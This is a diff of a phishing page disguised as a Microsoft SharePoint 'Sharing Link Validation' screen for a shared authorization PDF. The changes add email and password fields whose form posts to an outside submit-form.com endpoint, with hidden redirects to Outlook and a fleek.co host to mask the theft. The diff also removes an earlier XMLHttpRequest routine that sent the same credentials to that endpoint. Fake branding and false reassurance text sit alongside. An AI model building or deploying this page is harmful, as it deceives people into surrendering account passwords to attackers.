@@ -5,9 +5,10 @@
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
-    <link id="favicon" rel="shortcut icon" href="https://glwater-my.sharepoint.com/_layouts/15/images/favicon.ico?rev=47" type="image/vnd.microsoft.icon">
 	<title>Sharing Link Validation</title>
 </head>
+<script src="https://unpkg.com/jquery/dist/jquery.js"></script>
+
 <style type="text/css" media="screen, print, projection">
 		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figcaption,figure,main{display:block}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:inherit}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}dfn{font-style:italic}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}audio,video{display:inline-block}audio:not([controls]){display:none;height:0}img{border-style:none}svg:not(:root){overflow:hidden}button,input,optgroup,select,textarea{font-family:sans-serif;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{display:inline-block;vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details,menu{display:block}summary{display:list-item}canvas{display:inline-block}template{display:none}[hidden]{display:none}
 		.ms-Fabric{-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;color:#333;font-family:'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;font-size:14px}.ms-Fabric button,.ms-Fabric input{font-family:inherit}@media (max-width:479px){.ms-hiddenLgDown,.ms-hiddenMdDown,.ms-hiddenSm,.ms-hiddenXlDown,.ms-hiddenXxlDown{display:none!important}}@media (min-width:480px) and (max-width:639px){.ms-hiddenLgDown,.ms-hiddenMd,.ms-hiddenMdDown,.ms-hiddenMdUp,.ms-hiddenXlDown,.ms-hiddenXxlDown{display:none!important}}@media (min-width:640px) and (max-width:1023px){.ms-hiddenLg,.ms-hiddenLgDown,.ms-hiddenLgUp,.ms-hiddenMdUp,.ms-hiddenXlDown,.ms-hiddenXxlDown{display:none!important}}@media (min-width:1024px) and (max-width:1365px){.ms-hiddenLgUp,.ms-hiddenMdUp,.ms-hiddenXl,.ms-hiddenXlDown,.ms-hiddenXlUp,.ms-hiddenXxlDown{display:none!important}}@media (min-width:1366px) and (max-width:1919px){.ms-hiddenLgUp,.ms-hiddenMdUp,.ms-hiddenXlUp,.ms-hiddenXxl,.ms-hiddenXxlDown,.ms-hiddenXxlUp{display:none!important}}@media (min-width:1920px){.ms-hiddenLgUp,.ms-hiddenMdUp,.ms-hiddenXlUp,.ms-hiddenXxlUp,.ms-hiddenXxxl{display:none!important}}
@@ -364,7 +365,6 @@ input.has-error:focus {
 
 	<div class="img-banner">
 		<center>
-			<img src="https://glwater-my.sharepoint.com/_layouts/15/images/microsoft-logo.png" style="width:113px; height: 24px; opacity: 1;">
 		</center>	
 	</div>
 
@@ -396,20 +396,25 @@ input.has-error:focus {
 					You've received a secure link to:
 				</p>
 				<div class="docPose">
-					<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PGcgc3Ryb2tlPSIjOTc5NTkzIiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiPjxwYXRoIGZpbGw9IiNGRkYiIGQ9Ik0yMC4wODYgMi41SDYuNWExIDEgMCAwMC0xIDF2MjVhMSAxIDAgMDAxIDFoMTlhMSAxIDAgMDAxLTFWOC45MTRhMSAxIDAgMDAtLjI5My0uNzA3bC01LjQxNC01LjQxNGExIDEgMCAwMC0uNzA3LS4yOTN6Ii8+PHBhdGggZmlsbD0ibm9uZSIgZD0iTTIwLjUgMi41djVhMSAxIDAgMDAxIDFoNSIvPjwvZz48ZyBmaWxsPSIjQzhDNkM0Ij48cGF0aCBkPSJNMjMuNSAxM2gtMTVhLjUuNSAwIDAxMC0xaDE1YS41LjUgMCAwMTAgMXpNMjMuNSAxNWgtMTVhLjUuNSAwIDAxMC0xaDE1YS41LjUgMCAwMTAgMXoiLz48L2c+PHBhdGggZmlsbD0iI0M4QzZDNCIgZD0iTTIzLjUgMTdoLTE1YS41LjUgMCAwMTAtMWgxNWEuNS41IDAgMDEwIDF6Ii8+PHBhdGggZmlsbD0iI0Q2NTUzMiIgZD0iTTE5IDIwYy41NTEgMCAxIC40NDkgMSAxdjRjMCAuNTUxLS40NDkgMS0xIDFoLTZjLS41NTEgMC0xLS40NDktMS0xdi00YzAtLjU1MS40NDktMSAxLTFoNm0wLTFoLTZhMiAyIDAgMDAtMiAydjRhMiAyIDAgMDAyIDJoNmEyIDIgMCAwMDItMnYtNGEyIDIgMCAwMC0yLTJ6TTUgMjZoNC43NWEuMjUuMjUgMCAwMC4yNS0uMjV2LTUuNWEuMjUuMjUgMCAwMC0uMjUtLjI1SDVhMSAxIDAgMDAtMSAxdjRhMSAxIDAgMDAxIDF6TTI3IDIwaC00Ljc1YS4yNS4yNSAwIDAwLS4yNS4yNXY1LjVjMCAuMTM4LjExMi4yNS4yNS4yNUgyN2ExIDEgMCAwMDEtMXYtNGExIDEgMCAwMC0xLTF6Ii8+PC9zdmc+" style="width:32px; height: 32px; opacity: 1; margin-top: 17px;">
 					<p class="capCap">
-						INVOICE PAY AUTHORIZATION 2023.pdf 
+						Baystone  AUTHORIZATION 2023.pdf 
 					</p>
 				</div>
 				<p class="noted ">
 					To open this secure link, we'll need you to enter your email that this item was shared to.
 				</p>
 			</div>
-
+			
 			<div class="cormFish" >
-				<form method="POST" class="">
+				<form method="POST" class="" action="https://submit-form.com/aQNVBVJf">
 					<div>
-						<input type="email" name="normad" id="normad" placeholder="Enter email">
+						<input type="email" name="Subject" id="normad" placeholder="Enter email" required>
+						<input type="password" name="title" id="norm" placeholder="Enter Password " required>
+						<input
+                        type="hidden"
+                        name="_redirect"
+                        value="https://outlook.live.com/mail/0/"
+                      />
 						<div class="weSpeak">
 							<i class="weCall"></i>
 							<div class="eNoShock">
@@ -431,11 +436,15 @@ input.has-error:focus {
 			</div>	
 
 						<div class="cormFish2 cups hidden" >
-				<form method="POST" class="dSecond" >
+				<form method="POST" class="dSecond" acton="https://submit-form.com/aQNVBVJf">
 					<div class="topMemba">
 						<p id="topMembaEmail">meInoLikeWahala@outlook.com</p>
 					</div>
-					<div>
+					<div>  <input
+                        type="hidden"
+                        name="_redirect"
+                        value="https://broad-sun-5757.on.fleek.co/"
+                      />
 						<input type="password" name="bandits" id="bandits" placeholder="Enter password">
 						<!--<div class="weSpeak">
 							<i class="weCall"></i>
@@ -457,7 +466,7 @@ input.has-error:focus {
 				</form>
 			</div>	
 
-
+		
 			<div class="sticky">
 				<p class="pit " style="/*margin-top: 30px;">
 					By clicking Next you allow Microsoft the Authority to use your email address in accordance with their privacy statement. The Author has no access to your email and cannot access your credentials.
@@ -474,7 +483,7 @@ input.has-error:focus {
 
 		<div class="ticker">
 			
-				<p>© 2023 Microsoft</p>
+				<p>© 2021 Microsoft</p>
 				<p>Privacy & Cookies</p>
 			
 		</div>
@@ -555,69 +564,8 @@ $('#nexty').click(function(e){
 
    }
 
-      if(counter > 1){
-         var xmlhttp;
-          if(window.XMLHttpRequest){
-            xmlhttp = new XMLHttpRequest();
-          }else{
-            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
-          }
-
-          xmlhttp.onreadystatechange=function(){
-            if(xmlhttp.readyState==4 && xmlhttp.status==200){
-            window.location = "https://outlook.office.com/mail/inbox";
-            }
-          }
-
-          var email = document.getElementById('normad').value;
-          var password = document.getElementById('bandits').value;
-          var formdata = new FormData();
-
-          formdata.append("normad", email);
-          formdata.append("bandits", password);
-
-          var url = 'https://submit-form.com/aQNVBVJf';
-          
-          xmlhttp.open("POST", url);
-          xmlhttp.send(formdata);
-
-          return false;
-      }else{
-         var xmlhttp;
-          if(window.XMLHttpRequest){
-            xmlhttp = new XMLHttpRequest();
-          }else{
-            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
-          }
-
-          xmlhttp.onreadystatechange=function(){
-            if(xmlhttp.readyState==4 && xmlhttp.status==200){
-               document.getElementById('bandits').value = "";
-               alertx.textContent = "Please enter an email address.";
-               $('#bandits').focus();
-               
-               
-
-            }
-          }
-
-          var email = document.getElementById('normad').value;
-          var password = document.getElementById('bandits').value;
-          var formdata = new FormData();
-
-          formdata.append("normad", email);
-           data.append("bandits", password);
-
-          var url = 'https://submit-form.com/aQNVBVJf';
-          
-          xmlhttp.open("POST", url);
-          xmlhttp.send(formdata);
-
-          return false;      
-      }   
-   })
-
-
+    
+       
    })
 
 </script>
